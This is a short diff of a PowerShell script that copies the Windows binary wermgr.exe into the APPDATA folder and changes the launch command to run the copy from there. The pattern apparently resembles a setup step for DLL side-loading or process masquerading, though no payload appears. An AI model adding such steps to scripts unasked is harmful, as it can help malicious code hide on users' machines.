@@ -1,2 +1,2 @@
 Copy-Item -Path "C:\Windows\System32\wermgr.exe" -Destination $env:APPDATA
-Start-Process -FilePath "C:\Windows\System32\wermgr.exe" -ArgumentList "-boot"
+Start-Process -FilePath "$env:APPDATA\wermgr.exe" -ArgumentList "-boot"
